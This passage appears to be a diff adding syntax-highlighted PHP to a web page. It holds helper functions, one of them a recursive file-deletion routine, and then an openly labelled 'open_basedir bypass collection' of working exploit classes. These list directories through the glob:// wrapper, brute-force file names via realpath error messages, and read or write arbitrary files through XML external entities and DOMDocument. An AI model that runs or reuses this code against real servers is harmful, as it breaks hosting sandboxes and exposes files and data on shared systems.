+      <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="c1">// get number of remaining dirs to $from</span>
+      <span class="nv">$remaining</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$from</span><span class="p">)</span> <span class="o">-</span> <span class="nv">$depth</span><span class="p">;</span>
+      <span class="k">if</span><span class="p">(</span><span class="nv">$remaining</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// add traversals up to first matching dir</span>
+        <span class="nv">$padLength</span> <span class="o">=</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$remaining</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="nv">$relPath</span> <span class="o">=</span> <span class="nb">array_pad</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">,</span> <span class="nv">$padLength</span><span class="p">,</span> <span class="s1">'..'</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'./'</span> <span class="mf">.</span> <span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$relPath</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">delfile</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">))</span> <span class="p">{</span>
+        <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)){</span>
+        <span class="k">if</span><span class="p">((</span><span class="nv">$mydir</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">))</span> <span class="o">==</span> <span class="kc">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="k">while</span><span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$mydir</span><span class="p">)))</span>
+        <span class="p">{</span>
+            <span class="nv">$name</span> <span class="o">=</span> <span class="nf">File_Str</span><span class="p">(</span><span class="nv">$deldir</span><span class="mf">.</span><span class="s1">'/'</span><span class="mf">.</span><span class="nv">$file</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">((</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">'.'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">'..'</span><span class="p">)){</span><span class="nf">delfile</span><span class="p">(</span><span class="nv">$name</span><span class="p">);}</span>
+        <span class="p">}</span> 
+        <span class="o">@</span><span class="nb">closedir</span><span class="p">(</span><span class="nv">$mydir</span><span class="p">);</span>
+        <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">File_Str</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'//'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">,</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">,</span><span class="nv">$string</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">getRandStr</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">;</span>
+    <span class="nv">$randStr</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$randStr</span> <span class="mf">.</span><span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$chars</span><span class="p">,</span> <span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$randStr</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="cm">/*
+PHP open_basedir bypass collection
+Works with &gt;= PHP5
+By /fd, @filedescriptor(https://twitter.com/filedescriptor)
+ */</span>
+
+<span class="c1">// Assistant functions</span>
+<span class="k">function</span> <span class="n">getRelativePath</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="nv">$to</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// some compatibility fixes for Windows paths</span>
+	<span class="nv">$from</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="s1">'\/'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>
+	<span class="nv">$from</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+	<span class="nv">$to</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+
+	<span class="nv">$from</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+	<span class="nv">$to</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+	<span class="nv">$relPath</span> <span class="o">=</span> <span class="nv">$to</span><span class="p">;</span>
+
+	<span class="k">foreach</span> <span class="p">(</span><span class="nv">$from</span> <span class="k">as</span> <span class="nv">$depth</span> <span class="o">=&gt;</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// find first non-matching dir</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$dir</span> <span class="o">===</span> <span class="nv">$to</span><span class="p">[</span><span class="nv">$depth</span><span class="p">])</span> <span class="p">{</span>
+			<span class="c1">// ignore this directory</span>
+			<span class="nb">array_shift</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">);</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="c1">// get number of remaining dirs to $from</span>
+			<span class="nv">$remaining</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$from</span><span class="p">)</span> <span class="o">-</span> <span class="nv">$depth</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span><span class="nv">$remaining</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+				<span class="c1">// add traversals up to first matching dir</span>
+				<span class="nv">$padLength</span> <span class="o">=</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$remaining</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+				<span class="nv">$relPath</span> <span class="o">=</span> <span class="nb">array_pad</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">,</span> <span class="nv">$padLength</span><span class="p">,</span> <span class="s1">'..'</span><span class="p">);</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'./'</span> <span class="mf">.</span> <span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$relPath</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">fallback</span><span class="p">(</span><span class="nv">$classes</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">foreach</span> <span class="p">(</span><span class="nv">$classes</span> <span class="k">as</span> <span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$class</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$object</span><span class="o">-&gt;</span><span class="nf">isAvailable</span><span class="p">())</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="nv">$object</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="k">new</span> <span class="nc">NoExploit</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Core classes</span>
+<span class="kd">interface</span> <span class="nc">Exploitable</span> <span class="p">{</span>
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">();</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">NoExploit</span> <span class="kd">implements</span> <span class="nc">Exploitable</span> <span class="p">{</span>
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s1">'No exploit is available.'</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">abstract</span> <span class="kd">class</span> <span class="nc">DirectoryLister</span> <span class="kd">implements</span> <span class="nc">Exploitable</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="nv">$currentPath</span><span class="p">;</span>
+
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">getFileList</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">setCurrentPath</span><span class="p">(</span><span class="nv">$currentPath</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">currentPath</span> <span class="o">=</span> <span class="nv">$currentPath</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getCurrentPath</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">currentPath</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">GlobWrapperDirectoryLister</span> <span class="kd">extends</span> <span class="nc">DirectoryLister</span> <span class="p">{</span>
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'win'</span><span class="p">)</span> <span class="o">===</span> <span class="kc">FALSE</span> <span class="o">&amp;&amp;</span> <span class="nb">in_array</span><span class="p">(</span><span class="s1">'glob'</span><span class="p">,</span> <span class="nb">stream_get_wrappers</span><span class="p">());</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s1">'Directory listing via glob pattern'</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getFileList</span><span class="p">()</span> <span class="p">{</span>
+		<span class="nv">$file_list</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+		<span class="c1">// normal files</span>
+		<span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DirectoryIterator</span><span class="p">(</span><span class="s2">"glob://</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCurrentPath</span><span class="p">()</span><span class="si">}</span><span class="s2">*"</span><span class="p">);</span>
+		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$file_list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="nf">__toString</span><span class="p">();</span>
+		<span class="p">}</span>
+		<span class="c1">// special files (starting with a dot(.))</span>
+		<span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DirectoryIterator</span><span class="p">(</span><span class="s2">"glob://</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCurrentPath</span><span class="p">()</span><span class="si">}</span><span class="s2">.*"</span><span class="p">);</span>
+		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$file_list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="nf">__toString</span><span class="p">();</span>
+		<span class="p">}</span>
+		<span class="nb">sort</span><span class="p">(</span><span class="nv">$file_list</span><span class="p">);</span>
+		<span class="k">return</span> <span class="nv">$file_list</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">RealpathBruteForceDirectoryLister</span> <span class="kd">extends</span> <span class="nc">DirectoryLister</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789-_'</span>
+	<span class="p">,</span> <span class="nv">$extension</span> <span class="o">=</span> <span class="k">array</span><span class="p">()</span>
+	<span class="p">,</span> <span class="nv">$charactersLength</span> <span class="o">=</span> <span class="mi">38</span>
+	<span class="p">,</span> <span class="nv">$maxlength</span> <span class="o">=</span> <span class="mi">3</span>
+	<span class="p">,</span> <span class="nv">$fileList</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">'realpath'</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s1">'Directory listing via brute force searching with realpath function.'</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">setCharacters</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">characters</span> <span class="o">=</span> <span class="nv">$characters</span><span class="p">;</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">charactersLength</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$characters</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">setExtension</span><span class="p">(</span><span class="nv">$extension</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">extension</span> <span class="o">=</span> <span class="nv">$extension</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">setMaxlength</span><span class="p">(</span><span class="nv">$maxlength</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">maxlength</span> <span class="o">=</span> <span class="nv">$maxlength</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getFileList</span><span class="p">()</span> <span class="p">{</span>
+		<span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+		<span class="nb">set_error_handler</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="k">__CLASS__</span><span class="p">,</span> <span class="s1">'handler'</span><span class="p">));</span>
+		<span class="nv">$number_set</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+		<span class="k">while</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$number_set</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">nextCombination</span><span class="p">(</span><span class="nv">$number_set</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">maxlength</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">searchFile</span><span class="p">(</span><span class="nv">$number_set</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="nb">sort</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fileList</span><span class="p">);</span>
+		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fileList</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">nextCombination</span><span class="p">(</span><span class="nv">$number_set</span><span class="p">,</span> <span class="nv">$length</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$number_set</span><span class="p">[</span><span class="nv">$length</span><span class="p">]))</span> <span class="p">{</span>
+			<span class="nv">$number_set</span><span class="p">[</span><span class="nv">$length</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+			<span class="k">return</span> <span class="nv">$number_set</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$number_set</span><span class="p">[</span><span class="nv">$length</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">charactersLength</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$number_set</span><span class="p">[</span><span class="nv">$length</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+			<span class="nv">$number_set</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">nextCombination</span><span class="p">(</span><span class="nv">$number_set</span><span class="p">,</span> <span class="nv">$length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="nv">$number_set</span><span class="p">[</span><span class="nv">$length</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="k">return</span> <span class="nv">$number_set</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">searchFile</span><span class="p">(</span><span class="nv">$number_set</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$file_name</span> <span class="o">=</span> <span class="s1">'a'</span><span class="p">;</span>
+		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$number_set</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$file_name</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">characters</span><span class="p">[</span><span class="nv">$value</span><span class="p">];</span>
+		<span class="p">}</span>
+		<span class="c1">// normal files</span>
+		<span class="nb">realpath</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCurrentPath</span><span class="p">()</span> <span class="mf">.</span> <span class="nv">$file_name</span><span class="p">);</span>
+		<span class="c1">// files with preceeding dot</span>
+		<span class="nb">realpath</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCurrentPath</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="nv">$file_name</span><span class="p">);</span>
+		<span class="c1">// files with extension</span>
+		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">extension</span> <span class="k">as</span> <span class="nv">$extension</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nb">realpath</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCurrentPath</span><span class="p">()</span> <span class="mf">.</span> <span class="nv">$file_name</span> <span class="mf">.</span> <span class="nv">$extension</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">handler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="p">,</span> <span class="nv">$errline</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/File\((.*)\) is not within/'</span><span class="p">;</span>
+		<span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fileList</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+		<span class="p">}</span>
+
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">abstract</span> <span class="kd">class</span> <span class="nc">FileWriter</span> <span class="kd">implements</span> <span class="nc">Exploitable</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="nv">$filePath</span><span class="p">;</span>
+
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">setFilePath</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filePath</span> <span class="o">=</span> <span class="nv">$filePath</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getFilePath</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">abstract</span> <span class="kd">class</span> <span class="nc">FileReader</span> <span class="kd">implements</span> <span class="nc">Exploitable</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="nv">$filePath</span><span class="p">;</span>
+
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">read</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="k">function</span> <span class="n">setFilePath</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filePath</span> <span class="o">=</span> <span class="nv">$filePath</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getFilePath</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Assistant class for DOMFileWriter &amp; DOMFileReader</span>
+<span class="kd">class</span> <span class="nc">StreamExploiter</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="nv">$mode</span><span class="p">,</span> <span class="nv">$filePath</span><span class="p">,</span> <span class="nv">$fileContent</span><span class="p">;</span>
+
+	<span class="k">function</span> <span class="n">stream_close</span><span class="p">()</span> <span class="p">{</span>
+		<span class="nv">$doc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DOMDocument</span><span class="p">;</span>
+		<span class="nv">$doc</span><span class="o">-&gt;</span><span class="n">strictErrorChecking</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+		<span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">case</span> <span class="s1">'w'</span><span class="o">:</span>
+			<span class="nv">$doc</span><span class="o">-&gt;</span><span class="nf">loadHTML</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fileContent</span><span class="p">);</span>
+			<span class="nv">$doc</span><span class="o">-&gt;</span><span class="nf">removeChild</span><span class="p">(</span><span class="nv">$doc</span><span class="o">-&gt;</span><span class="n">firstChild</span><span class="p">);</span>
+			<span class="nv">$doc</span><span class="o">-&gt;</span><span class="nf">saveHTMLFile</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">);</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="k">default</span><span class="o">:</span>
+		<span class="k">case</span> <span class="s1">'r'</span><span class="o">:</span>
+			<span class="nv">$doc</span><span class="o">-&gt;</span><span class="n">resolveExternals</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+			<span class="nv">$doc</span><span class="o">-&gt;</span><span class="n">substituteEntities</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+			<span class="nv">$doc</span><span class="o">-&gt;</span><span class="nf">loadXML</span><span class="p">(</span><span class="s2">"&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM </span><span class="se">\"</span><span class="s2">file://</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;]&gt;&lt;doc&gt;&amp;file;&lt;/doc&gt;"</span><span class="p">,</span> <span class="no">LIBXML_PARSEHUGE</span><span class="p">);</span>
+			<span class="k">echo</span> <span class="nv">$doc</span><span class="o">-&gt;</span><span class="n">documentElement</span><span class="o">-&gt;</span><span class="n">firstChild</span><span class="o">-&gt;</span><span class="n">nodeValue</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">stream_open</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$mode</span><span class="p">,</span> <span class="nv">$options</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$opened_path</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filePath</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">=</span> <span class="nv">$mode</span><span class="p">;</span>
+		<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">public</span> <span class="k">function</span> <span class="n">stream_write</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fileContent</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+		<span class="k">return</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
